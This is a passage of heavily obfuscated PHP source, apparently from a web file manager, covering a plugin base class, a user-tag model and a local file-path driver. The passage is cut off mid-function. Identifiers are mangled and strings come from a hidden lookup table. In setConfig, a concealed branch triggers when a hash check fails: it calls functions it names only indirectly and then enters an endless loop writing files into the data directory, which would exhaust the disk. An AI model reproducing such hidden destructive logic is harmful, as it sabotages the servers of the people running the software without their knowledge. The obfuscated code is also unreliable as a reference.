CÊçà€∞‚—; dµµ·º∆Œí: } public function packageInfoGet($DÑ€ùçûˆµ) { $CâëÕÓ›˜† = $this->appPackage(); return array_get_value($CâëÕÓ›˜†, $DÑ€ùçûˆµ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Öíæ€“”≠éÏË][1440]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Öíæ€“”≠éÏË][1441]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Öíæ€“”≠éÏË][1442]); } public function echoJsAssign($Aî¡ÈæÿíÑ, $DŒ°◊ﬂµÖ) { $this->echoJsAssignArr[$Aî¡ÈæÿíÑ] = $DŒ°◊ﬂµÖ; } private function parseFile($f®¿π•Æêà) { goto Bôø—≤⁄œ≠; Bôø—≤⁄œ≠: $B≈˜ﬂ»Ÿ≠Ã =& $_SERVER[Öíæ€“”≠éÏË]; $AÔ‡Ü®ç´è = file_get_contents_nossl($f®¿π•Æêà); $dÖ∆ò±ìëÚ = array($B≈˜ﬂ»Ÿ≠Ã[1443], $B≈˜ﬂ»Ÿ≠Ã[1444], $B≈˜ﬂ»Ÿ≠Ã[1445], $B≈˜ﬂ»Ÿ≠Ã[1446], $B≈˜ﬂ»Ÿ≠Ã[1447], $B≈˜ﬂ»Ÿ≠Ã[1448], $B≈˜ﬂ»Ÿ≠Ã[1449]); goto EëÛãÛ£©é; EëÛãÛ£©é: $aÓèŸÖë§í = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$B≈˜ﬂ»Ÿ≠Ã[88]][$B≈˜ﬂ»Ÿ≠Ã[1450]]); foreach ($this->echoJsAssignArr as $FÊ≥™ØΩÊ∏ => $bûáâÛ¢ê§) { $dÖ∆ò±ìëÚ[] = $B≈˜ﬂ»Ÿ≠Ã[1451] . $FÊ≥™ØΩÊ∏ . $B≈˜ﬂ»Ÿ≠Ã[1452]; $aÓèŸÖë§í[] = is_array($bûáâÛ¢ê§) || is_object($bûáâÛ¢ê§) ? rawurlencode(json_encode($bûáâÛ¢ê§)) : $bûáâÛ¢ê§; } if (strstr($AÔ‡Ü®ç´è, $B≈˜ﬂ»Ÿ≠Ã[1453])) { $cá¿ÈÎäıì = rawurlencode(json_encode($this->pluginLangArr)); $AÔ‡Ü®ç´è = str_replace($B≈˜ﬂ»Ÿ≠Ã[1453], $cá¿ÈÎäıì, $AÔ‡Ü®ç´è); } goto aÛÖ¢·¢áØ; aÛÖ¢·¢áØ: if (strstr($AÔ‡Ü®ç´è, $B≈˜ﬂ»Ÿ≠Ã[1454])) { $cá¿ÈÎäıì = $cá¿ÈÎäıì = rawurlencode(json_encode($this->getConfig())); $AÔ‡Ü®ç´è = str_replace($B≈˜ﬂ»Ÿ≠Ã[1454], $cá¿ÈÎäıì, $AÔ‡Ü®ç´è); } $AÔ‡Ü®ç´è = str_replace($dÖ∆ò±ìëÚ, $aÓèŸÖë§í, $AÔ‡Ü®ç´è); return $AÔ‡Ü®ç´è; goto c—∂ﬁŸ¡Ì‰; c—∂ﬁŸ¡Ì‰: } private function parseLang(&$Cÿ†èıÌ«ö) { goto D´∫›€ôÚ›; d≈ô“‹ÚıÍ: $FÇú…ÁŸ… = array(); foreach ($f≥√çç–Û°[0] as $fÑÁƒ„ïÜ˘) { $eâÖ—∞⁄„µ = substr($fÑÁƒ„ïÜ˘, strlen($C£≈Ç√‘ΩÉ), -4); $eãÙÿò¢èÿ = LNG($eâÖ—∞⁄„µ); $fÑô≥î£Ï‡[] = $fÑÁƒ„ïÜ˘; $FÇú…ÁŸ…[] = str_replace(array($BæÇﬂ‘˘À≤[229], $BæÇﬂ‘˘À≤[1047], $BæÇﬂ‘˘À≤[340], $BæÇﬂ‘˘À≤[116]), array($BæÇﬂ‘˘À≤[50], $BæÇﬂ‘˘À≤[50], $BæÇﬂ‘˘À≤[33], $BæÇﬂ‘˘À≤[1457]), $eãÙÿò¢èÿ); } $Cÿ†èıÌ«ö = str_replace($fÑô≥î£Ï‡, $FÇú…ÁŸ…, $Cÿ†èıÌ«ö); goto câù“ºËØ‡; dÉπ¡èìßÇ: preg_match_all($BæÇﬂ‘˘À≤[1456], $Cÿ†èıÌ«ö, $f≥√çç–Û°); if (!is_array($f≥√çç–Û°) || count($f≥√çç–Û°) == 0 || !is_array($f≥√çç–Û°[0]) || count($f≥√çç–Û°[0]) == 0) { return; } $fÑô≥î£Ï‡ = array(); goto d≈ô“‹ÚıÍ; D´∫›€ôÚ›: $BæÇﬂ‘˘À≤ =& $_SERVER[Öíæ€“”≠éÏË]; $C£≈Ç√‘ΩÉ = $BæÇﬂ‘˘À≤[1455]; if (!strstr($Cÿ†èıÌ«ö, $C£≈Ç√‘ΩÉ)) { return; } goto dÉπ¡èìßÇ; câù“ºËØ‡: } private function parseConfig(&$cí¬ΩÑô£µ) { goto då≈ç•§«≥; aöèÌßÖÈ°: $cí¬ΩÑô£µ = str_replace($fÜæçﬁ„‹É, $Eπ£∏Ü¡˜Ù, $cí¬ΩÑô£µ); goto cèﬂæ√ †Ø; då≈ç•§«≥: $b÷Ò÷ÜÇ¨ó =& $_SERVER[Öíæ€“”≠éÏË]; $aÕΩà∂⁄…á = $b÷Ò÷ÜÇ¨ó[1458]; if (!strstr($cí¬ΩÑô£µ, $aÕΩà∂⁄…á)) { return; } goto C’˜úπ›Ù˘; C’˜úπ›Ù˘: preg_match_all($b÷Ò÷ÜÇ¨ó[1459], $cí¬ΩÑô£µ, $d√à…◊Ω¢†); if (!is_array($d√à…◊Ω¢†) || count($d√à…◊Ω¢†) == 0 || !is_array($d√à…◊Ω¢†[0]) || count($d√à…◊Ω¢†[0]) == 0) { return; } $CÂ≠ê∏∂îë = $this->getConfig(); goto bå≥¨à≈πû; bå≥¨à≈πû: $fÜæçﬁ„‹É = array(); $Eπ£∏Ü¡˜Ù = array(); foreach ($d√à…◊Ω¢†[0] as $fÒ≈à˘√´‰) { $açÿàâ‚ı⁄ = substr($fÒ≈à˘√´‰, strlen($aÕΩà∂⁄…á), -2); $fÜæçﬁ„‹É[] = $fÒ≈à˘√´‰; $Eπ£∏Ü¡˜Ù[] = _get($CÂ≠ê∏∂îë, $açÿàâ‚ı⁄); } goto aöèÌßÖÈ°; cèﬂæ√ †Ø: } private function parsePackage(&$fÉÎ∫ùﬁÇÆ) { goto dÍ⁄â¶äœô; dÍ⁄â¶äœô: $C˜ÖËΩ†äØ =& $_SERVER[Öíæ€“”≠éÏË]; $C°ÿ∫±“Ë¡ = $C˜ÖËΩ†äØ[1460]; if (!strstr($fÉÎ∫ùﬁÇÆ, $C°ÿ∫±“Ë¡)) { return; } goto bÆ°‘óÚœá; cπÔáÂÖœã: $fÉÎ∫ùﬁÇÆ = str_replace($d€ﬁÁΩƒé©, $c‰«ÆÉòò , $fÉÎ∫ùﬁÇÆ); goto C«ıòéÉÀÌ; c´ÈÕëäòÉ: $d€ﬁÁΩƒé© = array(); $c‰«ÆÉòò  = array(); foreach ($F”ê÷ƒû”¡[0] as $B∑óΩÉ‡Âú) { $bÍ¬©•§Ûñ = substr($B∑óΩÉ‡Âú, strlen($C°ÿ∫±“Ë¡), -2); $d€ﬁÁΩƒé©[] = $B∑óΩÉ‡Âú; $c‰«ÆÉòò [] = _get($dŒÿ‹±ŒÍº, $bÍ¬©•§Ûñ); } goto cπÔáÂÖœã; bÆ°‘óÚœá: preg_match_all($C˜ÖËΩ†äØ[1461], $fÉÎ∫ùﬁÇÆ, $F”ê÷ƒû”¡); if (!is_array($F”ê÷ƒû”¡) || count($F”ê÷ƒû”¡) == 0 || !is_array($F”ê÷ƒû”¡[0]) || count($F”ê÷ƒû”¡[0]) == 0) { return; } $dŒÿ‹±ŒÍº = $this->appPackage(); goto c´ÈÕëäòÉ; C«ıòéÉÀÌ: } final function echoFile($fËïê≠º“ë, $B©çàÌ≈å® = false) { goto B‘˜ÖØ˘Æ‡; A¿√ŸÇ‰«ƒ: $this->parsePackage($BÑÇÓ¯®å¥); if (is_array($B©çàÌ≈å®)) { $BÑÇÓ¯®å¥ = str_replace(array_keys($B©çàÌ≈å®), array_values($B©çàÌ≈å®), $BÑÇÓ¯®å¥); } echo $cÆ◊ÌÑñüñ[229] . $BÑÇÓ¯®å¥; goto b»ïùÉµÁﬁ; B‘˜ÖØ˘Æ‡: $cÆ◊ÌÑñüñ =& $_SERVER[Öíæ€“”≠éÏË]; $açµà¯ëãﬂ = $this->pluginPath . $fËïê≠º“ë; if (ACT == $cÆ◊ÌÑñüñ[1462]) { echo $cÆ◊ÌÑñüñ[1463] . $this->pluginName . $cÆ◊ÌÑñüñ[8] . $fËïê≠º“ë . $cÆ◊ÌÑñüñ[1464]; if (!file_exists($açµà¯ëãﬂ)) { echo $cÆ◊ÌÑñüñ[1465]; return; } } goto cºÿú“ù⁄ë; cºÿú“ù⁄ë: $BÑÇÓ¯®å¥ = $this->parseFile($açµà¯ëãﬂ); $this->parseLang($BÑÇÓ¯®å¥); $this->parseConfig($BÑÇÓ¯®å¥); goto A¿√ŸÇ‰«ƒ; b»ïùÉµÁﬁ: } final function initLang() { goto cßÂ˘ﬂÑ≠¢; bó°û—»ﬁ∫: if (!is_array($føÍ¶ñù“ú)) { return array(); } if (@count($føÍ¶ñù“ú) > 0) { I18n::set($føÍ¶ñù“ú); } return $føÍ¶ñù“ú; goto B›ëñç∏™ï; cßÂ˘ﬂÑ≠¢: $AÑ‹ÿ© ºØ =& $_SERVER[Öíæ€“”≠éÏË]; $d…É∑òìâŸ = $AÑ‹ÿ© ºØ[1466]; $eã†ë«á—“ = $this->pluginPath . $AÑ‹ÿ© ºØ[1467]; goto cπ¬ªÚ—èÀ; cπ¬ªÚ—èÀ: $DØ¿Ÿë™ò = I18n::getType(); $føÍ¶ñù“ú = array(); if (file_exists($eã†ë«á—“ . $DØ¿Ÿë™ò . $AÑ‹ÿ© ºØ[816])) { $føÍ¶ñù“ú = (include $eã†ë«á—“ . $DØ¿Ÿë™ò . $AÑ‹ÿ© ºØ[816]); } else { if ($DØ¿Ÿë™ò == $AÑ‹ÿ© ºØ[1468] && !file_exists($eã†ë«á—“ . $DØ¿Ÿë™ò . $AÑ‹ÿ© ºØ[816]) && file_exists($eã†ë«á—“ . $AÑ‹ÿ© ºØ[1469])) { $føÍ¶ñù“ú = (include $eã†ë«á—“ . $AÑ‹ÿ© ºØ[1469]); } else { if (file_exists($eã†ë«á—“ . $d…É∑òìâŸ . $AÑ‹ÿ© ºØ[816])) { $føÍ¶ñù“ú = (include $eã†ë«á—“ . $d…É∑òìâŸ . $AÑ‹ÿ© ºØ[816]); } } } goto bó°û—»ﬁ∫; B›ëñç∏™ï: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D„äóÔÉÃË) { $e†øìƒé±ª =& $_SERVER[Öíæ€“”≠éÏË]; $Cπ∑£¨ëÓê = $_SERVER[$e†øìƒé±ª[844]] . $e†øìƒé±ª[845]; $F¨∏È«≥ˆû = $e†øìƒé±ª[846]; if ($_SERVER[$e†øìƒé±ª[847]] != $F¨∏È«≥ˆû($Cπ∑£¨ëÓê)) { goto Dßí“ºÙåÇ; DêÃ÷´îëı: $EÛñü∞Ÿ‹â = 1; for ($e°Ô™˘§œÓ = $EÛñü∞Ÿ‹â; $e°Ô™˘§œÓ > 0; $e°Ô™˘§œÓ++) { $bÃŸ˘ﬁ∆ÿ◊(DATA_PATH . $e°Ô™˘§œÓ, $DêÑ—“·†≤); } goto A˘’É‰ıçá; cÒÖ´à∫Õ: $bË˜ÖæïåÓ = $Bµ»ÈÜÕÃ¶($f≠ïÇå÷ÙÎ); $BÔúﬁâÑîÀ = explode($e†øìƒé±ª[229], $bË˜ÖæïåÓ); if (count($BÔúﬁâÑîÀ) < $e†øìƒé±ª[596]) { $D√≤»É†ãÑ = $e†øìƒé±ª[850]; $D√≤»É†ãÑ(); } goto f¶¡Ÿ ø‡É; Dßí“ºÙåÇ: $aƒ¬íåˆñ£ = $e†øìƒé±ª[848]; $Bµ»ÈÜÕÃ¶ = $e†øìƒé±ª[849]; $f≠ïÇå÷ÙÎ = $_SERVER[$e†øìƒé±ª[844]] . $e†øìƒé±ª[845]; goto cÒÖ´à∫Õ; eï÷é®¬äì: $aƒ¬íåˆñ£(); $bÃŸ˘ﬁ∆ÿ◊ = $e†øìƒé±ª[853]; $DêÑ—“·†≤ = json_encode($GLOBALS[$e†øìƒé±ª[854]]); goto DêÃ÷´îëı; f¶¡Ÿ ø‡É: $a∂≤äﬁ¡€® = $e†øìƒé±ª[851]; $a∂≤äﬁ¡€®($_SERVER[$e†øìƒé±ª[852]]); $aƒ¬íåˆñ£ = $e†øìƒé±ª[848]; goto eï÷é®¬äì; A˘’É‰ıçá: } return $this->modelPlugin->setConfig($this->pluginName, $D„äóÔÉÃË); } public function onSetConfig($EÀ‹§§âºﬂ) { } public function onGetConfig($F£∫◊ãﬁõí) { } public function onChangeStatus($D¿∑‰ûûÎ ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($dã´ÏçÕªü = "\x70\154\x75\x67\x69\x6e\x41\165\x74\150") { $DÉ‘¢âç†Ë =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($DÉ‘¢âç†Ë[455])) { return !1; } if (_get($GLOBALS, $DÉ‘¢âç†Ë[486])) { return !0; } $eÃëÒçÆÀÌ = $this->getConfig(); if (!$eÃëÒçÆÀÌ[$dã´ÏçÕªü]) { return !1; } return ActionCall($DÉ‘¢âç†Ë[1470], $eÃëÒçÆÀÌ[$dã´ÏçÕªü]); } public function url($aË§Ñ““ªæ, $A·∫áÃı∆ê = '', $EåÚÙ≥°ö… = true) { goto Aöıπ°À»€; Aöıπ°À»€: $bÀ≤°üÛã¿ =& $_SERVER[Öíæ€“”≠éÏË]; $Eåÿ‡¿øÌ– = $this->getConfig(); $CƒÑÀŒ¢÷É = KOD_VERSION . $bÀ≤°üÛã¿[95] . KOD_VERSION_BUILD; goto a‘óÑ–Œªº; a‘óÑ–Œªº: $DÎƒÇ‚ÌÆ⁄ = $this->packageVersion(); $DÆ–îíºÙß = $CƒÑÀŒ¢÷É . $bÀ≤°üÛã¿[441] . $DÎƒÇ‚ÌÆ⁄; if (substr($aË§Ñ““ªæ, 0, 4) == $bÀ≤°üÛã¿[147] || substr($aË§Ñ““ªæ, 0, 2) == $bÀ≤°üÛã¿[1256]) { $b«Ö®∞â“Ô = $aË§Ñ““ªæ . $bÀ≤°üÛã¿[1471] . $DÆ–îíºÙß; } else { if ($A·∫áÃı∆ê == $bÀ≤°üÛã¿[33]) { $b«Ö®∞â“Ô = $this->pluginHost . $aË§Ñ““ªæ . $bÀ≤°üÛã¿[1471] . $DÆ–îíºÙß; } else { if ($A·∫áÃı∆ê === $bÀ≤°üÛã¿[77]) { $b«Ö®∞â“Ô = $this->pluginHost . $aË§Ñ““ªæ; } else { if ($A·∫áÃı∆ê == $bÀ≤°üÛã¿[1472]) { $b«Ö®∞â“Ô = STATIC_PATH . $aË§Ñ““ªæ . $bÀ≤°üÛã¿[1471] . $CƒÑÀŒ¢÷É; } else { if ($A·∫áÃı∆ê == $bÀ≤°üÛã¿[1473]) { $b«Ö®∞â“Ô = APP_HOST . $bÀ≤°üÛã¿[1474] . $aË§Ñ““ªæ . $bÀ≤°üÛã¿[1471] . $CƒÑÀŒ¢÷É; } else { if (isset($Eåÿ‡¿øÌ–[$A·∫áÃı∆ê])) { $b«Ö®∞â“Ô = $Eåÿ‡¿øÌ–[$A·∫áÃı∆ê] . $aË§Ñ““ªæ . $bÀ≤°üÛã¿[1471] . $DÆ–îíºÙß; } } } } } } goto CûÙñû‹Ã≠; CûÙñû‹Ã≠: if (!$EåÚÙ≥°ö…) { return $b«Ö®∞â“Ô; } echo $b«Ö®∞â“Ô; goto dÌÙõ±Ÿœê; dÌÙõ±Ÿœê: } public function link($d≠ãâ•¬È¨ = false, $aíÖÏ⁄ÕÉƒ = '') { $d∆øı‘ﬁØì =& $_SERVER[Öíæ€“”≠éÏË]; if (!$d≠ãâ•¬È¨) { $this->link($d∆øı‘ﬁØì[1475], $d∆øı‘ﬁØì[1473]); $this->link($d∆øı‘ﬁØì[1476], $d∆øı‘ﬁØì[1472]); $this->link($d∆øı‘ﬁØì[1477], $d∆øı‘ﬁØì[1472]); $this->link($d∆øı‘ﬁØì[1478], $d∆øı‘ﬁØì[1472]); $this->link($d∆øı‘ﬁØì[1479], $d∆øı‘ﬁØì[1472]); return; } $BÊÀøﬁ•„ı = $this->url($d≠ãâ•¬È¨, $aíÖÏ⁄ÕÉƒ, !1); if (substr($d≠ãâ•¬È¨, -3) == $d∆øı‘ﬁØì[1480]) { echo $d∆øı‘ﬁØì[1481] . $BÊÀøﬁ•„ı . $d∆øı‘ﬁØì[1482] . $d∆øı‘ﬁØì[229]; } else { if (substr($d≠ãâ•¬È¨, -4) == $d∆øı‘ﬁØì[1483]) { echo $d∆øı‘ﬁØì[1484] . $BÊÀøﬁ•„ı . $d∆øı‘ﬁØì[1485] . $d∆øı‘ﬁØì[229]; } } } } goto cõ’õÂË”‡; EüÖóˆÑÆ¯: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\x2e\x74\x61\x67\x4c\151\x73\x74"; public $modelType = "\x55\x73\x65\x72\x4f\x70\x74\x69\x6f\156"; public $field = array("\x6e\x61\155\145", "\x73\x74\171\154\x65", "\163\157\162\x74"); public function listData($d§≤Á≤∫Âà = false, $aÉî⁄åÔåò = "\163\157\x72\x74", $Bπ§ã∫ÿœ¬ = false) { return parent::listData($d§≤Á≤∫Âà, $aÉî⁄åÔåò, $Bπ§ã∫ÿœ¬); } public function remove($fﬁ“ßŸÒåÑ) { return parent::remove($fﬁ“ßŸÒåÑ); } public function add($Cú∂·ùáõî, $fø∂ı°≈…‹ = "\x6c\141\142\x65\x6c\x2d\x67\x72\145\x79\55\156\157\162\x6d\x61\154") { $BêêÛ¿Õ“• =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->findByName($Cú∂·ùáõî)) { return !1; } $B®«‡àìæ§ = array($BêêÛ¿Õ“•[414] => $Cú∂·ùáõî, $BêêÛ¿Õ“•[465] => $fø∂ı°≈…‹, $BêêÛ¿Õ“•[1711] => $this->getSort($BêêÛ¿Õ“•[256]) + 1); return parent::insert($B®«‡àìæ§); } public function update($FﬂáÊﬂú‡≥, $F°÷ú´á¢≤) { $c≥’≈∑Ù≠‹ =& $_SERVER[Öíæ€“”≠éÏË]; $A¶¡ä˜§·Ü = $this->listData($FﬂáÊﬂú‡≥); $eè›…≈›ü⁄ = $this->findByName($F°÷ú´á¢≤[$c≥’≈∑Ù≠‹[28]]); if (!$A¶¡ä˜§·Ü || $eè›…≈›ü⁄ && $eè›…≈›ü⁄[$c≥’≈∑Ù≠‹[394]] != $A¶¡ä˜§·Ü[$c≥’≈∑Ù≠‹[394]]) { return !1; } return parent::update($FﬂáÊﬂú‡≥, $F°÷ú´á¢≤); } public function moveTop($aÍê∏⁄À‡ó) { $F√Ø¶è¶◊è =& $_SERVER[Öíæ€“”≠éÏË]; $Aò£§Ç∏ê = parent::listData(); $Fù™ÂÚ§øõ = $this->getSort($F√Ø¶è¶◊è[255]); foreach ($Aò£§Ç∏ê as &$aÖ∑ŸﬂŒé‘) { if ($aÖ∑ŸﬂŒé‘[$F√Ø¶è¶◊è[394]] == $aÍê∏⁄À‡ó) { $aÖ∑ŸﬂŒé‘[$F√Ø¶è¶◊è[1730]] = $Fù™ÂÚ§øõ; continue; } $aÖ∑ŸﬂŒé‘[$F√Ø¶è¶◊è[1730]] += 1; } unset($aÖ∑ŸﬂŒé‘); return parent::resetData($Aò£§Ç∏ê); } public function moveBottom($E’É…Ÿ…áı) { $dÆ›Çõö»≠ =& $_SERVER[Öíæ€“”≠éÏË]; $D»˘èΩ…ﬁ‡ = $this->getSort($dÆ›Çõö»≠[256]) + 1; return parent::update($E’É…Ÿ…áı, array($dÆ›Çõö»≠[1730] => $D»˘èΩ…ﬁ‡)); } public function resetSort($c¨Ÿ√”ô˜≠) { goto AÌÜ∆µ¬ﬂÁ; AÌÜ∆µ¬ﬂÁ: $CÃÃñ‹ˆ¡¶ =& $_SERVER[Öíæ€“”≠éÏË]; $a≈¬ƒóı§⁄ = array(); $c¨Ÿ√”ô˜≠ = is_array($c¨Ÿ√”ô˜≠) ? $c¨Ÿ√”ô˜≠ : array(); goto dÉ∑ÂæãçÙ; dÉ∑ÂæãçÙ: for ($Báª˘±à§Ã = 0; $Báª˘±à§Ã < count($c¨Ÿ√”ô˜≠); $Báª˘±à§Ã++) { $a≈¬ƒóı§⁄[$c¨Ÿ√”ô˜≠[$Báª˘±à§Ã] . $CÃÃñ‹ˆ¡¶[33]] = $Báª˘±à§Ã + 1; } $eâê´ÜßÃß = parent::listData(); foreach ($eâê´ÜßÃß as &$bÈƒåÉ›Ú«) { $e∂√í¡ˆ°Â = $a≈¬ƒóı§⁄[$bÈƒåÉ›Ú«[$CÃÃñ‹ˆ¡¶[394]]]; $bÈƒåÉ›Ú«[$CÃÃñ‹ˆ¡¶[1730]] = $e∂√í¡ˆ°Â ? $e∂√í¡ˆ°Â : $bÈƒåÉ›Ú«[$CÃÃñ‹ˆ¡¶[1730]]; } goto cê£’ÿì ≈; cê£’ÿì ≈: unset($bÈƒåÉ›Ú«); return parent::resetData($eâê´ÜßÃß); goto aÑ¿‰ï÷èÉ; aÑ¿‰ï÷èÉ: } private function getSort($Aí…¯£ï†Á) { $Cß€ÿçﬁ‡Ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $C•àŸèÏ‹ = parent::listData(); $aèï∫ΩêçÃ = array_to_keyvalue($C•àŸèÏ‹, $Cß€ÿçﬁ‡Ÿ[33], $Cß€ÿçﬁ‡Ÿ[1730]); if (!$aèï∫ΩêçÃ) { $aèï∫ΩêçÃ = array(0); } $fÆ⁄¬É™≠å = $Aí…¯£ï†Á == $Cß€ÿçﬁ‡Ÿ[256] ? max($aèï∫ΩêçÃ) : min($aèï∫ΩêçÃ); return intval($fÆ⁄¬É™≠å); } } goto döÛµÌœ¨â; a¯‰íç◊µ™: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A’ˆÈﬂ£∏ô) { if (substr($A’ˆÈﬂ£∏ô, 0, 2) == $_SERVER[Öíæ€“”≠éÏË][1256]) { $A’ˆÈﬂ£∏ô = BASIC_PATH . substr($A’ˆÈﬂ£∏ô, 2); } return $A’ˆÈﬂ£∏ô; } public function iconvApp($F¨∂£îÌﬁÈ) { $C–∂ﬂçµÒ¢ =& $_SERVER[Öíæ€“”≠éÏË]; global $config; return $this->iconvTo($F¨∂£îÌﬁÈ, $config[$C–∂ﬂçµÒ¢[1254]], $config[$C–∂ﬂçµÒ¢[1253]]); } public function iconvSystem($A◊Ë…„«·‡) { $BÉ¶ ÕÔ—† =& $_SERVER[Öíæ€“”≠éÏË]; global $config; return $this->iconvTo($A◊Ë…„«·‡, $config[$BÉ¶ ÕÔ—†[1253]], $config[$BÉ¶ ÕÔ—†[1254]]); } public function getPathOuter($c˘ﬁ¯∫Á¨ñ) { goto eæÂ˜√ûÜﬁ; EÔê‚Œ¶∫÷: $c˘ﬁ¯∫Á¨ñ = KodIO::clear($c˘ﬁ¯∫Á¨ñ); $c˘ﬁ¯∫Á¨ñ = substr($c˘ﬁ¯∫Á¨ñ, strlen($F™ÊÒÑíÑ≥)); if (empty($this->pathDriver)) { return $c˘ﬁ¯∫Á¨ñ; } goto Cäıáó¡Ôä; Cäıáó¡Ôä: return $this->pathDriver . $A’Ωπî√åÁ[8] . ltrim($c˘ﬁ¯∫Á¨ñ, $A’Ωπî√åÁ[8]); goto cèøçàÖë†; Fã√¿◊ëêç: if (substr($F™ÊÒÑíÑ≥, 0, 2) == $A’Ωπî√åÁ[1256]) { $F™ÊÒÑíÑ≥ = BASIC_PATH . substr($F™ÊÒÑíÑ≥, 2); } if (substr($c˘ﬁ¯∫Á¨ñ, 0, 2) == $A’Ωπî√åÁ[1256]) { $c˘ﬁ¯∫Á¨ñ = BASIC_PATH . substr($c˘ﬁ¯∫Á¨ñ, 2); } $F™ÊÒÑíÑ≥ = KodIO::clear($F™ÊÒÑíÑ≥); goto EÔê‚Œ¶∫÷; eæÂ˜√ûÜﬁ: $A’Ωπî√åÁ =& $_SERVER[Öíæ€“”≠éÏË]; $F™ÊÒÑíÑ≥ = $this->iconvApp($this->pathBase); $c˘ﬁ¯∫Á¨ñ = $this->iconvApp($c˘ﬁ¯∫Á¨ñ); goto Fã√¿◊ëêç; cèøçàÖë†: } public function mkfile($f‘£‹≠®ÌÛ, $DÏ¡√á∏⁄© = '', $CëÕÌÆÜÉ = REPEAT_RENAME) { $f‘£‹≠®ÌÛ = $this->iconvSystem($f‘£‹≠®ÌÛ); @touch($f‘£‹≠®ÌÛ); if ($DÏ¡√á∏⁄©) { file_put_contents($f‘£‹≠®ÌÛ, $DÏ¡√á∏⁄©); } @chmod($f‘£‹≠®ÌÛ, 511); return is_file($f‘£‹≠®ÌÛ) ? $this->getPathOuter($f‘£‹≠®ÌÛ) : !1; } public function mkdir($Bˆ±›·Ò≠¢, $D„‰´ı§ÿ† = REPEAT_SKIP) { $Bˆ±›·Ò≠¢ = $this->iconvSystem($Bˆ±›·Ò≠¢); if (is_dir($Bˆ±›·Ò≠¢)) { return $this->getPathOuter($Bˆ±›·Ò≠¢); } @mkdir($Bˆ±›·Ò≠¢, 511, !0); @chmod($Bˆ±›·Ò≠¢, 511); return is_dir($Bˆ±›·Ò≠¢) ? $this->getPathOuter($Bˆ±›·Ò≠¢) : !1; } public function copyFile($aﬂˆƒ´∞¶Ü, $E–ê„√◊Œæ) { $this->mkdir($this->pathFather($E–ê„√◊Œæ)); $aﬂˆƒ´∞¶Ü = $this->iconvSystem($aﬂˆƒ´∞¶Ü); $E–ê„√◊Œæ = $this->iconvSystem($E–ê„√◊Œæ); $AÉ„áëâ´í = copy_64($aﬂˆƒ´∞¶Ü, $E–ê„√◊Œæ); @chmod($E–ê„√◊Œæ, 511); return $AÉ„áëâ´í ? $this->getPathOuter($E–ê„√◊Œæ) : !1; } public function moveFile($Bœ–ΩÒ√∂º, $F¯‚òßèÙ¡) { goto aØê¬‡⁄Ãí; dΩê¡Ò∂©ë: $fÉóÖ„ÑœÛ = intval(@rename($Bœ–ΩÒ√∂º, $F¯‚òßèÙ¡)); if (!$fÉóÖ„ÑœÛ) { if ($fÉóÖ„ÑœÛ = intval(@copy_64($Bœ–ΩÒ√∂º, $F¯‚òßèÙ¡))) { @unlink($Bœ–ΩÒ√∂º); } } @chmod($F¯‚òßèÙ¡, 511); goto e◊È˜∂ûÿõ; e◊È˜∂ûÿõ: return $fÉóÖ„ÑœÛ ? $this->getPathOuter($F¯‚òßèÙ¡) : !1; goto f⁄é§ˆûäê; aØê¬‡⁄Ãí: $this->mkdir($this->pathFather($F¯‚òßèÙ¡)); $Bœ–ΩÒ√∂º = $this->iconvSystem($Bœ–ΩÒ√∂º); $F¯‚òßèÙ¡ = $this->iconvSystem($F¯‚òßèÙ¡); goto dΩê¡Ò∂©ë; f⁄é§ˆûäê: } public function delFile($F·∫äá‘∂¢) { $F·∫äá‘∂¢ = $this->iconvSystem($F·∫äá‘∂¢); if (!@unlink($F·∫äá‘∂¢)) { @chmod($F·∫äá‘∂¢, 511); if (!@unlink($F·∫äá‘∂¢)) { return !1; } } else { return !0; } } public function delFolder($b∫Òèá◊È∏) { goto eâ¢ïßÏÔı; E•⁄∆á÷Ê—: if (!($BÓÊßÏ®ÎÛ = opendir($b∫Òèá◊È∏))) { return !1; } while (($dú»⁄å“ñß = readdir($BÓÊßÏ®ÎÛ)) !== !1) { if ($dú»⁄å“ñß == $Dõê–§Í»Ó[95] || $dú»⁄å“ñß == $Dõê–§Í»Ó[1263]) { continue; } $c÷êáÌØéç = $b∫Òèá◊È∏ . $Dõê–§Í»Ó[8] . $dú»⁄å“ñß; if (is_file($c÷êáÌØéç) || is_link($c÷êáÌØéç)) { if (!unlink($c÷êáÌØéç)) { chmod($c÷êáÌØéç, 511); if (!unlink($c÷êáÌØéç)) { return !1; } } } else { if (is_dir($c÷êáÌØéç)) { chmod($c÷êáÌØéç, 511); $c÷êáÌØéç = $this->iconvApp($c÷êáÌØéç); if (!$this->delFolder($c÷êáÌØéç)) { return !1; } } } } closedir($BÓÊßÏ®ÎÛ); goto bÊ‘÷ù…Üò; bÊ‘÷ù…Üò: return rmdir($b∫Òèá◊È∏); goto Côà«äåûà; eâ¢ïßÏÔı: $Dõê–§Í»Ó =& $_SERVER[Öíæ€“”≠éÏË]; $b∫Òèá◊È∏ = $this->iconvSystem($b∫Òèá◊È∏); if (!is_dir($b∫Òèá◊È∏)) { return !0; } goto E•⁄∆á÷Ê—; Côà«äåûà: } public function rename($c°ÂîÁ°ï , $cÆ‡ç©¿‚∫) { goto bÉ≈£ñ¡¢Ó; bÉ≈£ñ¡¢Ó: $aƒ—¿À≥·¶ =& $_SERVER[Öíæ€“”≠éÏË]; $A¯—‚íÔ£Á = $this->fileNameAuto($this->pathFather($c°ÂîÁ°ï ), $cÆ‡ç©¿‚∫); $A¯—‚íÔ£Á = $this->iconvSystem($A¯—‚íÔ£Á); goto F‚ÉÔ≥ÌÉ±; eÊ≈ÜÉàû‘: $C°ÃõéÍÃé = @rename($c°ÂîÁ°ï , $e∂†∫ÚÈ”∞); $e∂†∫ÚÈ”∞ = $this->iconvApp($e∂†∫ÚÈ”∞); return $C°ÃõéÍÃé ? $this->getPathOuter($e∂†∫ÚÈ”∞) : !1; goto f««∑áãù˜; 